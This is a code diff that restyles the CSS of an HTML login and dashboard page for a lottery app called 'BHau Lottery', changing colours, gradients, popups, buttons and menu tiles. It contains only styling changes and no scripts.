@@ -2,212 +2,151 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>BHAU · Sanju Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>Soumya · BHau Lottery</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
     }
-
     body {
       min-height: 100vh;
-      background: #050713;
-      color: #f7f8ff;
+      background: #0b1120;
+      color: #f1f5f9;
       display: flex;
       justify-content: center;
       align-items: flex-start;
-      background:
-        radial-gradient(circle at 50% 0%, rgba(126, 39, 255, 0.25) 0%, transparent 40%),
-        radial-gradient(circle at 10% 80%, rgba(24, 102, 255, 0.15) 0%, transparent 35%),
-        radial-gradient(circle at 95% 60%, rgba(181, 38, 255, 0.12) 0%, transparent 30%),
-        #050713;
-      padding: 14px 10px 30px;
+      background: radial-gradient(ellipse at 30% 20%, rgba(139, 92, 246, 0.08) 0%, transparent 55%),
+                  radial-gradient(ellipse at 70% 80%, rgba(251, 113, 133, 0.06) 0%, transparent 50%),
+                  #0b1120;
+      padding: 16px 12px 30px;
     }
-
-    .page {
-      width: 100%;
-      max-width: 500px;
-      margin: 0 auto;
-      position: relative;
-    }
-
+    .page { width: 100%; max-width: 500px; margin: 0 auto; position: relative; }
     .glass {
-      background: linear-gradient(145deg, rgba(22, 27, 55, 0.8), rgba(6, 10, 25, 0.7));
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid rgba(151, 119, 255, 0.2);
-      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6), 0 0 40px rgba(102, 36, 255, 0.06);
-      border-radius: 36px;
+      background: rgba(18, 24, 40, 0.78);
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5), 0 0 60px rgba(139, 92, 246, 0.02);
+      border-radius: 40px;
       padding: 24px 18px 18px;
-      transition: all 0.2s;
+      transition: box-shadow 0.25s;
     }
-
     .toast-notification {
       position: fixed;
-      top: 10px;
+      top: 14px;
       left: 50%;
-      transform: translateX(-50%);
+      transform: translateX(-50%) translateY(-24px);
       z-index: 99999;
-      padding: 12px 20px;
-      border-radius: 14px;
+      padding: 14px 22px;
+      border-radius: 18px;
       font-weight: 700;
       font-size: 14px;
       max-width: 460px;
-      width: calc(100% - 30px);
+      width: calc(100% - 32px);
       text-align: center;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      backdrop-filter: blur(10px);
-      transition: all 0.4s ease;
+      box-shadow: 0 16px 48px rgba(0, 0, 0, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      background: rgba(11, 17, 32, 0.96);
+      transition: opacity 0.3s ease, transform 0.3s ease;
       opacity: 0;
-      transform: translateX(-50%) translateY(-20px);
       pointer-events: none;
+      will-change: transform, opacity;
     }
-    .toast-notification.show {
-      opacity: 1;
-      transform: translateX(-50%) translateY(0);
-      pointer-events: auto;
-    }
-    .toast-notification.error {
-      background: rgba(180, 20, 30, 0.92);
-      color: #fff;
-      border-color: rgba(255, 80, 80, 0.3);
-    }
-    .toast-notification.success {
-      background: rgba(20, 140, 60, 0.92);
-      color: #fff;
-      border-color: rgba(80, 255, 80, 0.2);
-    }
-    .toast-notification.warning {
-      background: rgba(180, 120, 20, 0.92);
-      color: #fff;
-      border-color: rgba(255, 200, 80, 0.2);
-    }
-
-    .logout-confirm-overlay {
+    .toast-notification.show { opacity: 1; transform: translateX(-50%) translateY(0); pointer-events: auto; }
+    .toast-notification.error { background: rgba(200, 30, 50, 0.95); color: #fff; border-color: rgba(255, 80, 80, 0.2); }
+    .toast-notification.success { background: rgba(20, 160, 70, 0.95); color: #fff; border-color: rgba(80, 255, 80, 0.1); }
+    .toast-notification.warning { background: rgba(180, 120, 20, 0.95); color: #fff; border-color: rgba(255, 200, 80, 0.1); }
+    .logout-confirm-overlay, .exit-overlay {
       display: none;
       position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0, 0, 0, 0.75);
-      backdrop-filter: blur(8px);
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
       z-index: 99999;
       justify-content: center;
       align-items: center;
     }
-    .logout-confirm-overlay.active {
-      display: flex;
-    }
-    .logout-confirm-popup {
-      background: linear-gradient(145deg, rgba(22, 27, 55, 0.98), rgba(6, 10, 25, 0.99));
-      border: 1px solid rgba(255, 107, 107, 0.3);
-      border-radius: 28px;
-      padding: 30px 24px 24px;
+    .logout-confirm-overlay.active, .exit-overlay.active { display: flex; animation: fadeIn 0.25s ease; }
+    @keyframes fadeIn { 0% { opacity: 0; } 100% { opacity: 1; } }
+    .logout-confirm-popup, .exit-popup {
+      background: linear-gradient(145deg, rgba(18, 24, 40, 0.98), rgba(8, 12, 26, 0.99));
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 32px;
+      padding: 32px 24px 24px;
       max-width: 380px;
       width: 90%;
       text-align: center;
-      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), 0 0 60px rgba(255, 50, 50, 0.05);
-      animation: popupIn 0.3s ease;
+      box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8);
+      animation: popIn 0.3s ease;
     }
-    @keyframes popupIn {
-      0% { transform: scale(0.9); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
+    @keyframes popIn { 0% { transform: scale(0.92); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+    .logout-confirm-popup .popup-icon, .exit-popup .popup-icon { font-size: 48px; margin-bottom: 12px; }
+    .logout-confirm-popup .popup-title, .exit-popup .popup-title { font-size: 22px; font-weight: 800; color: #f1f5f9; margin-bottom: 6px; }
+    .logout-confirm-popup .popup-sub, .exit-popup .popup-sub { color: #94a3b8; font-size: 14px; margin-bottom: 20px; }
+    .logout-confirm-popup .popup-buttons, .exit-popup .popup-buttons { display: flex; gap: 12px; }
+    .logout-confirm-popup .popup-buttons button, .exit-popup .popup-buttons button {
+      flex: 1; padding: 14px 10px; border: none; border-radius: 18px;
+      font-weight: 700; font-size: 15px; cursor: pointer;
+      transition: transform 0.15s ease; will-change: transform;
     }
-    .logout-confirm-popup .popup-icon {
-      font-size: 48px;
-      margin-bottom: 12px;
-    }
-    .logout-confirm-popup .popup-title {
-      font-size: 22px;
-      font-weight: 800;
-      color: #f7f8ff;
-      margin-bottom: 6px;
-    }
-    .logout-confirm-popup .popup-sub {
-      color: #8a9aaa;
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
-    .logout-confirm-popup .popup-buttons {
-      display: flex;
-      gap: 12px;
-    }
-    .logout-confirm-popup .popup-buttons button {
-      flex: 1;
-      padding: 14px 10px;
-      border: none;
-      border-radius: 16px;
-      font-weight: 700;
-      font-size: 15px;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-    .logout-confirm-popup .popup-buttons button:active {
-      transform: scale(0.96);
-    }
+    .logout-confirm-popup .popup-buttons button:active, .exit-popup .popup-buttons button:active { transform: scale(0.96); }
     .logout-confirm-popup .popup-buttons .btn-yes {
-      background: linear-gradient(100deg, #ff2d2d, #cc1111);
+      background: linear-gradient(100deg, #fb7185, #e11d48);
       color: #fff;
-      box-shadow: 0 8px 25px rgba(255, 40, 40, 0.3);
+      box-shadow: 0 8px 30px rgba(251, 113, 133, 0.2);
     }
     .logout-confirm-popup .popup-buttons .btn-no {
-      background: rgba(255, 255, 255, 0.06);
-      color: #8a9aaa;
-      border: 1px solid rgba(255, 255, 255, 0.08);
+      background: rgba(255, 255, 255, 0.04);
+      color: #94a3b8;
+      border: 1px solid rgba(255, 255, 255, 0.04);
     }
-    .logout-confirm-popup .popup-buttons .btn-no:hover {
-      background: rgba(255, 255, 255, 0.12);
-      color: #f7f8ff;
+    .logout-confirm-popup .popup-buttons .btn-no:hover { background: rgba(255, 255, 255, 0.08); color: #f1f5f9; }
+    .exit-popup { border-color: rgba(139, 92, 246, 0.1); }
+    .exit-popup .popup-buttons .btn-stay {
+      background: linear-gradient(100deg, #8b5cf6, #6d28d9);
+      color: #fff;
+      box-shadow: 0 8px 30px rgba(139, 92, 246, 0.15);
     }
-
-    .login-section {
-      margin-top: 8px;
+    .exit-popup .popup-buttons .btn-exit {
+      background: rgba(251, 113, 133, 0.04);
+      color: #fb7185;
+      border: 1px solid rgba(251, 113, 133, 0.06);
     }
-    .welcome-text {
-      text-align: center;
-      margin-bottom: 24px;
-    }
+    .exit-popup .popup-buttons .btn-exit:hover { background: rgba(251, 113, 133, 0.08); }
+    .login-section { margin-top: 6px; }
+    .welcome-text { text-align: center; margin-bottom: 28px; }
     .welcome-text .mini {
-      color: #c75aff;
-      font-size: 12px;
-      letter-spacing: 4px;
+      color: #fbbf24;
+      font-size: 11px;
+      letter-spacing: 5px;
       font-weight: 800;
+      text-transform: uppercase;
       margin-bottom: 4px;
-    }
-    .welcome-text h1 {
-      font-size: 28px;
-      margin-bottom: 2px;
-    }
-    .welcome-text h1 span {
-      color: #bd57ff;
-      text-shadow: 0 0 20px rgba(189, 87, 255, 0.3);
     }
     .welcome-text .sub-title {
-      font-size: 20px;
-      font-weight: 800;
-      color: #ffd700;
-      letter-spacing: 1px;
-      margin-bottom: 4px;
-      text-shadow: 0 0 30px rgba(255, 215, 0, 0.15);
+      font-size: 28px;
+      font-weight: 900;
+      background: linear-gradient(135deg, #fbbf24, #fb7185);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: 0.5px;
+      margin-bottom: 2px;
     }
-    .welcome-text p {
-      color: #9299b8;
-      font-size: 14px;
-      margin-top: 4px;
-    }
-
-    .form-group {
-      margin-bottom: 18px;
-    }
+    .welcome-text .sub-title .highlight { -webkit-text-fill-color: #8b5cf6; }
+    .welcome-text p { color: #94a3b8; font-size: 14px; margin-top: 4px; font-weight: 400; }
+    .form-group { margin-bottom: 18px; }
     .label {
       display: block;
-      color: #9db8ed;
-      font-size: 13px;
+      color: #a5b4fc;
+      font-size: 12px;
       font-weight: 700;
       letter-spacing: 1px;
       margin-bottom: 6px;
@@ -215,219 +154,144 @@
     .input-wrap {
       display: flex;
       align-items: center;
-      height: 56px;
-      border-radius: 18px;
-      border: 1px solid rgba(129, 112, 255, 0.25);
-      background: rgba(5, 9, 24, 0.7);
-      box-shadow: inset 0 1px rgba(255, 255, 255, 0.04);
-      transition: 0.2s;
+      height: 58px;
+      border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.04);
+      background: rgba(8, 12, 26, 0.6);
+      box-shadow: inset 0 1px rgba(255, 255, 255, 0.02);
+      transition: border 0.2s, box-shadow 0.2s;
+      will-change: border, box-shadow;
     }
     .input-wrap:focus-within {
-      border-color: #8b51ff;
-      box-shadow: 0 0 0 3px rgba(139, 81, 255, 0.12), 0 0 28px rgba(139, 81, 255, 0.08);
+      border-color: rgba(139, 92, 246, 0.3);
+      box-shadow: 0 0 0 4px rgba(139, 92, 246, 0.03), 0 0 40px rgba(139, 92, 246, 0.02);
     }
-    .input-icon {
-      width: 50px;
-      text-align: center;
-      font-size: 20px;
-      flex-shrink: 0;
-    }
+    .input-icon { width: 52px; text-align: center; font-size: 20px; flex-shrink: 0; }
     .input-wrap input {
-      width: 100%;
-      height: 100%;
-      background: transparent;
-      border: none;
-      outline: none;
-      color: #fff;
-      font-size: 16px;
-      padding-right: 14px;
+      width: 100%; height: 100%;
+      background: transparent; border: none; outline: none;
+      color: #f1f5f9; font-size: 16px; padding-right: 14px;
     }
-    .input-wrap input::placeholder {
-      color: #686f8e;
-    }
+    .input-wrap input::placeholder { color: #4b5563; }
     .password-toggle {
-      background: none;
-      border: none;
-      color: #9da4c3;
-      font-size: 20px;
-      padding: 0 16px;
-      cursor: pointer;
+      background: none; border: none;
+      color: #6b7280; font-size: 20px;
+      padding: 0 16px; cursor: pointer;
+      touch-action: manipulation;
     }
-
     .login-btn {
-      width: 100%;
-      height: 58px;
-      border: none;
-      border-radius: 20px;
-      background: linear-gradient(100deg, #126aff, #6124e9 60%, #b22cff);
+      width: 100%; height: 60px;
+      border: none; border-radius: 22px;
+      background: linear-gradient(100deg, #8b5cf6, #6d28d9);
       color: #fff;
-      font-weight: 800;
-      font-size: 16px;
-      letter-spacing: 0.6px;
-      box-shadow: 0 14px 35px rgba(73, 46, 255, 0.3), inset 0 1px rgba(255, 255, 255, 0.2);
+      font-weight: 800; font-size: 16px;
+      letter-spacing: 0.4px;
+      box-shadow: 0 16px 40px rgba(139, 92, 246, 0.2), inset 0 1px rgba(255, 255, 255, 0.1);
       cursor: pointer;
-      transition: 0.2s;
-      margin-top: 6px;
+      transition: transform 0.15s ease, box-shadow 0.2s;
+      touch-action: manipulation;
+      will-change: transform;
     }
-    .login-btn:active {
-      transform: scale(0.97);
-    }
-    .login-btn:disabled {
-      opacity: 0.7;
-      transform: scale(0.98);
-    }
-
+    .login-btn:active { transform: scale(0.97); }
+    .login-btn:disabled { opacity: 0.7; transform: scale(0.98); }
     .autopaste-btn {
-      width: 100%;
-      height: 50px;
-      border: 1px solid rgba(255, 215, 0, 0.3);
-      border-radius: 16px;
-      background: rgba(255, 215, 0, 0.06);
-      color: #ffd700;
-      font-weight: 700;
-      font-size: 15px;
+      width: 100%; height: 52px;
+      border: 1px solid rgba(251, 189, 36, 0.15);
+      border-radius: 18px;
+      background: rgba(251, 189, 36, 0.03);
+      color: #fbbf24;
+      font-weight: 700; font-size: 15px;
       cursor: pointer;
-      transition: 0.2s;
-      margin-top: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
+      transition: background 0.2s, border 0.2s, transform 0.15s;
+      touch-action: manipulation;
+      will-change: transform;
+      display: flex; align-items: center; justify-content: center;
+      gap: 8px; margin-top: 10px;
     }
-    .autopaste-btn:hover {
-      background: rgba(255, 215, 0, 0.12);
-      border-color: rgba(255, 215, 0, 0.5);
-    }
-    .autopaste-btn:active {
-      transform: scale(0.97);
-    }
-    .autopaste-btn:disabled {
-      opacity: 0.4;
-      cursor: not-allowed;
-      transform: none;
-    }
-
+    .autopaste-btn:hover { background: rgba(251, 189, 36, 0.06); border-color: rgba(251, 189, 36, 0.25); }
+    .autopaste-btn:active { transform: scale(0.97); }
+    .autopaste-btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
     .telegram-section {
-      background: rgba(3, 7, 20, 0.4);
-      border: 1px solid rgba(0, 200, 255, 0.1);
-      border-radius: 16px;
+      background: rgba(139, 92, 246, 0.02);
+      border: 1px solid rgba(139, 92, 246, 0.04);
+      border-radius: 18px;
       padding: 14px 16px;
-      margin-top: 12px;
-      transition: 0.2s;
+      margin-top: 14px;
+      transition: border 0.2s;
     }
-    .telegram-section:hover {
-      border-color: rgba(0, 200, 255, 0.2);
-    }
-    .telegram-section .tg-title {
-      font-weight: 700;
-      color: #68a9ff;
-      font-size: 14px;
-      margin-bottom: 4px;
-    }
-    .telegram-section .tg-text {
-      color: #8a9aaa;
-      font-size: 12px;
-      margin-bottom: 8px;
-    }
+    .telegram-section:hover { border-color: rgba(139, 92, 246, 0.10); }
+    .telegram-section .tg-title { font-weight: 700; color: #a5b4fc; font-size: 14px; margin-bottom: 4px; }
+    .telegram-section .tg-text { color: #94a3b8; font-size: 12px; margin-bottom: 8px; }
     .telegram-section .tg-btn {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
+      display: inline-flex; align-items: center; gap: 8px;
       padding: 8px 20px;
-      background: linear-gradient(135deg, #0088cc, #006699);
-      color: #fff;
-      font-weight: 700;
-      font-size: 13px;
-      border: none;
-      border-radius: 30px;
+      background: linear-gradient(135deg, #fbbf24, #f59e0b);
+      color: #0b1120;
+      font-weight: 700; font-size: 13px;
+      border: none; border-radius: 30px;
       cursor: pointer;
-      transition: 0.2s;
+      transition: transform 0.15s, box-shadow 0.2s;
+      touch-action: manipulation;
       text-decoration: none;
+      will-change: transform;
     }
-    .telegram-section .tg-btn:hover {
-      transform: scale(1.02);
-      box-shadow: 0 0 25px rgba(0, 136, 204, 0.3);
-    }
-    .telegram-section .tg-btn:active {
-      transform: scale(0.96);
-    }
-
+    .telegram-section .tg-btn:active { transform: scale(0.96); }
     .login-footer {
       text-align: center;
-      margin-top: 18px;
-      padding: 10px 0;
-      color: #6a7a9a;
+      margin-top: 20px;
+      padding: 12px 0;
+      color: #4b5563;
       font-size: 13px;
       font-weight: 700;
       letter-spacing: 3px;
-      border-top: 1px solid rgba(255, 255, 255, 0.04);
+      border-top: 1px solid rgba(255, 255, 255, 0.02);
     }
-
-    .dashboard {
-      display: none;
-      margin-top: 4px;
-    }
-
+    .login-footer .highlight { color: #fbbf24; }
+    .dashboard { display: none; margin-top: 4px; }
     .user-badge {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      background: rgba(3, 7, 20, 0.35);
-      backdrop-filter: blur(24px);
-      -webkit-backdrop-filter: blur(24px);
+      background: rgba(139, 92, 246, 0.04);
       border-radius: 60px;
-      padding: 10px 18px 10px 14px;
-      border: 1px solid rgba(255, 215, 0, 0.12);
-      box-shadow:
-        0 8px 32px rgba(0, 0, 0, 0.4),
-        inset 0 1px rgba(255, 255, 255, 0.04),
-        0 0 40px rgba(255, 215, 0, 0.04);
+      padding: 10px 18px 10px 16px;
+      border: 1px solid rgba(139, 92, 246, 0.06);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3), inset 0 1px rgba(255, 255, 255, 0.02);
       margin-bottom: 20px;
       transition: box-shadow 0.3s;
     }
     .user-badge .phone {
       font-weight: 700;
-      color: #7dffb3;
+      color: #34d399;
       font-size: 15px;
       display: flex;
       align-items: center;
       gap: 6px;
     }
-    .user-badge .phone::before {
-      content: "👤";
-      font-size: 16px;
-    }
+    .user-badge .phone::before { content: "👤"; font-size: 16px; }
     .user-badge .balance {
       font-weight: 800;
       font-size: 18px;
-      color: #ffd700;
-      background: rgba(255, 215, 0, 0.07);
-      padding: 4px 16px;
+      color: #fbbf24;
+      background: rgba(251, 189, 36, 0.04);
+      padding: 4px 18px;
       border-radius: 40px;
-      border: 1px solid rgba(255, 215, 0, 0.12);
-      box-shadow: inset 0 1px rgba(255, 215, 0, 0.05);
+      border: 1px solid rgba(251, 189, 36, 0.04);
     }
-
     .save-number-panel {
-      background: rgba(3, 7, 20, 0.3);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid rgba(255, 215, 0, 0.08);
+      background: rgba(139, 92, 246, 0.02);
+      border: 1px solid rgba(139, 92, 246, 0.04);
       border-radius: 24px;
       padding: 16px 18px;
       margin-top: 6px;
       margin-bottom: 14px;
-      box-shadow:
-        0 8px 40px rgba(0, 0, 0, 0.3),
-        inset 0 1px rgba(255, 255, 255, 0.03);
+      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.15);
       transition: all 0.3s ease;
     }
-    .save-number-panel.hidden-panel {
-      display: none !important;
-    }
+    .save-number-panel.hidden-panel { display: none !important; }
     .save-number-panel .title {
       font-weight: 700;
-      color: #ffd700;
+      color: #a5b4fc;
       font-size: 14px;
       margin-bottom: 10px;
       display: flex;
@@ -436,146 +300,97 @@
     }
     .save-number-panel .title .status-badge {
       font-size: 11px;
-      color: #6a7a9a;
-      background: rgba(255, 255, 255, 0.04);
-      padding: 2px 12px;
+      color: #94a3b8;
+      background: rgba(255, 255, 255, 0.02);
+      padding: 2px 14px;
       border-radius: 20px;
-      border: 1px solid rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.02);
     }
-    .save-number-panel .input-group {
-      display: flex;
-      gap: 8px;
-    }
+    .save-number-panel .input-group { display: flex; gap: 8px; }
     .save-number-panel .input-group input {
       flex: 1;
       padding: 10px 14px;
-      background: rgba(5, 9, 24, 0.6);
-      backdrop-filter: blur(8px);
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      border-radius: 14px;
-      color: #eef2f9;
+      background: rgba(8, 12, 26, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.03);
+      border-radius: 16px;
+      color: #e2e8f0;
       font-size: 14px;
       outline: none;
-      transition: 0.2s;
-      box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.2);
+      transition: border 0.2s, box-shadow 0.2s;
+      box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.15);
     }
     .save-number-panel .input-group input:focus {
-      border-color: rgba(255, 215, 0, 0.2);
-      box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.04), inset 0 2px 8px rgba(0, 0, 0, 0.2);
+      border-color: rgba(139, 92, 246, 0.10);
+      box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.01), inset 0 2px 8px rgba(0, 0, 0, 0.15);
     }
     .save-number-panel .input-group .save-btn {
       padding: 10px 18px;
-      background: linear-gradient(135deg, #ffd700, #f0a500);
+      background: linear-gradient(135deg, #fbbf24, #f59e0b);
       border: none;
-      border-radius: 14px;
-      color: #000;
+      border-radius: 16px;
+      color: #0b1120;
       font-weight: 800;
       font-size: 13px;
       cursor: pointer;
-      transition: 0.2s;
+      transition: transform 0.15s, box-shadow 0.2s;
+      touch-action: manipulation;
       white-space: nowrap;
-      box-shadow: 0 4px 20px rgba(255, 215, 0, 0.15);
+      box-shadow: 0 4px 20px rgba(251, 189, 36, 0.08);
+      will-change: transform;
     }
-    .save-number-panel .input-group .save-btn:hover {
-      transform: scale(1.02);
-      box-shadow: 0 6px 30px rgba(255, 215, 0, 0.2);
-    }
-    .save-number-panel .input-group .save-btn:active {
-      transform: scale(0.96);
-    }
-    .save-number-panel .status-text {
-      margin-top: 8px;
-      font-size: 11px;
-      color: #6a7a9a;
-    }
-    .save-number-panel .number-list {
-      margin-top: 10px;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 6px;
-    }
+    .save-number-panel .input-group .save-btn:active { transform: scale(0.96); }
+    .save-number-panel .status-text { margin-top: 8px; font-size: 11px; color: #6b7280; }
+    .save-number-panel .number-list { margin-top: 10px; display: flex; flex-wrap: wrap; gap: 6px; }
     .number-item {
       display: flex;
       align-items: center;
       gap: 6px;
-      padding: 4px 12px 4px 10px;
-      background: rgba(255, 215, 0, 0.04);
+      padding: 4px 14px 4px 10px;
+      background: rgba(139, 92, 246, 0.04);
       border-radius: 20px;
-      border: 1px solid rgba(255, 215, 0, 0.06);
+      border: 1px solid rgba(139, 92, 246, 0.04);
       font-size: 12px;
       font-weight: 500;
     }
-    .number-item .num {
-      color: #f7f8ff;
-    }
-    .number-item .badge {
-      font-size: 8px;
-      color: #5df0ae;
-      background: rgba(93, 240, 174, 0.08);
-      padding: 1px 8px;
-      border-radius: 10px;
-      border: 1px solid rgba(93, 240, 174, 0.06);
-    }
-
+    .number-item .num { color: #f1f5f9; }
     .btn-auto-save-ref {
       width: 100%;
       padding: 10px;
-      background: linear-gradient(135deg, #ff6b35, #e55a2b);
+      background: linear-gradient(135deg, #fb7185, #e11d48);
       border: none;
-      border-radius: 14px;
+      border-radius: 16px;
       color: #fff;
       font-weight: 700;
       font-size: 14px;
       cursor: pointer;
-      transition: 0.2s;
+      transition: transform 0.15s, box-shadow 0.2s;
+      touch-action: manipulation;
       margin-top: 8px;
-      box-shadow: 0 4px 20px rgba(255, 107, 53, 0.15);
+      box-shadow: 0 4px 20px rgba(251, 113, 133, 0.08);
+      will-change: transform;
     }
-    .btn-auto-save-ref:hover {
-      transform: scale(1.02);
-      box-shadow: 0 6px 30px rgba(255, 107, 53, 0.2);
-    }
-    .btn-auto-save-ref:active {
-      transform: scale(0.96);
-    }
-    .btn-auto-save-ref:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: none;
-    }
-
-    #dynamicContent {
-      margin-bottom: 6px;
-      transition: all 0.35s cubic-bezier(0.16, 1, 0.3, 1);
-      order: -1;
-    }
-
-    .dashboard-content-wrapper {
-      display: flex;
-      flex-direction: column;
-    }
-
+    .btn-auto-save-ref:active { transform: scale(0.96); }
+    .btn-auto-save-ref:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+    #dynamicContent { margin-bottom: 6px; transition: all 0.3s ease; order: -1; }
+    .dashboard-content-wrapper { display: flex; flex-direction: column; }
     .menu-grid {
       display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 10px;
       margin-bottom: 16px;
-      transition: all 0.3s ease;
+      transition: gap 0.2s;
     }
-
     .menu-item {
-      background: rgba(3, 7, 20, 0.25);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(255, 255, 255, 0.04);
-      border-radius: 24px;
-      padding: 18px 8px 14px;
+      background: rgba(18, 24, 40, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.02);
+      border-radius: 20px;
+      padding: 16px 6px 12px;
       text-align: center;
       cursor: pointer;
-      transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
-      box-shadow:
-        0 4px 24px rgba(0, 0, 0, 0.2),
-        inset 0 1px rgba(255, 255, 255, 0.02);
+      transition: transform 0.2s, border 0.25s, box-shadow 0.25s, background 0.2s;
+      touch-action: manipulation;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.12);
+      will-change: transform, border, box-shadow, background;
       position: relative;
       overflow: hidden;
     }
@@ -583,120 +398,91 @@
       content: '';
       position: absolute;
       inset: 0;
-      border-radius: 24px;
-      background: radial-gradient(circle at 30% 20%, rgba(151, 119, 255, 0.04), transparent 60%);
+      border-radius: 20px;
+      background: radial-gradient(circle at 30% 20%, rgba(139, 92, 246, 0.03), transparent 60%);
       pointer-events: none;
       opacity: 0;
       transition: opacity 0.4s;
     }
-    .menu-item:hover::before {
-      opacity: 1;
-    }
-    .menu-item:active {
-      transform: scale(0.96);
-      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.3);
-    }
+    .menu-item:hover::before { opacity: 1; }
+    .menu-item:active { transform: scale(0.94); box-shadow: 0 2px 12px rgba(0, 0, 0, 0.25); }
     .menu-item:hover {
-      border-color: rgba(151, 119, 255, 0.15);
-      box-shadow:
-        0 8px 32px rgba(0, 0, 0, 0.25),
-        inset 0 1px rgba(255, 255, 255, 0.04);
+      border-color: rgba(139, 92, 246, 0.08);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
     }
-    .menu-item .icon {
-      font-size: 30px;
-      display: block;
-      margin-bottom: 4px;
-      filter: drop-shadow(0 2px 12px rgba(151, 119, 255, 0.08));
-      transition: filter 0.3s;
-    }
-    .menu-item:hover .icon {
-      filter: drop-shadow(0 2px 24px rgba(151, 119, 255, 0.15));
-    }
+    .menu-item .icon { font-size: 26px; display: block; margin-bottom: 2px; transition: filter 0.3s; }
     .menu-item .title {
-      font-size: 13px;
+      font-size: 11px;
       font-weight: 700;
-      color: #f0f3ff;
+      color: #cbd5e1;
       letter-spacing: 0.2px;
+      line-height: 1.2;
     }
     .menu-item .desc {
-      font-size: 9px;
-      color: #6a7a9a;
-      margin-top: 2px;
+      font-size: 8px;
+      color: #4b5563;
+      margin-top: 1px;
       letter-spacing: 0.2px;
     }
-
-    .menu-item.deposit-item { border-color: rgba(46, 213, 115, 0.08); }
-    .menu-item.deposit-item:hover { border-color: rgba(46, 213, 115, 0.2); }
-    .menu-item.withdraw-item { border-color: rgba(212, 160, 32, 0.08); }
-    .menu-item.withdraw-item:hover { border-color: rgba(212, 160, 32, 0.2); }
-    .menu-item.card-item { border-color: rgba(255, 215, 0, 0.06); }
-    .menu-item.card-item:hover { border-color: rgba(255, 215, 0, 0.15); }
+    .menu-item.deposit-item { border-color: rgba(52, 211, 153, 0.04); }
+    .menu-item.deposit-item:hover { border-color: rgba(52, 211, 153, 0.10); }
+    .menu-item.withdraw-item { border-color: rgba(251, 189, 36, 0.04); }
+    .menu-item.withdraw-item:hover { border-color: rgba(251, 189, 36, 0.10); }
+    .menu-item.card-item { border-color: rgba(139, 92, 246, 0.03); }
+    .menu-item.card-item:hover { border-color: rgba(139, 92, 246, 0.08); }
     .menu-item.auto-claim {
-      border-color: rgba(255, 215, 0, 0.08);
+      border-color: rgba(251, 189, 36, 0.04);
       animation: pulseGold 2.8s infinite;
     }
-    .menu-item.logout-item { border-color: rgba(255, 107, 107, 0.06); }
-    .menu-item.logout-item:hover { border-color: rgba(255, 107, 107, 0.2); }
-    .menu-item.refer-item { border-color: rgba(0, 200, 255, 0.06); }
-    .menu-item.refer-item:hover { border-color: rgba(0, 200, 255, 0.15); }
-
     @keyframes pulseGold {
-      0%, 100% { box-shadow: 0 4px 24px rgba(255, 215, 0, 0.02); }
-      50% { box-shadow: 0 4px 40px rgba(255, 215, 0, 0.06); }
+      0%, 100% { box-shadow: 0 4px 24px rgba(251, 189, 36, 0.005); }
+      50% { box-shadow: 0 4px 40px rgba(251, 189, 36, 0.02); }
     }
-
+    .menu-item.logout-item { border-color: rgba(251, 113, 133, 0.03); }
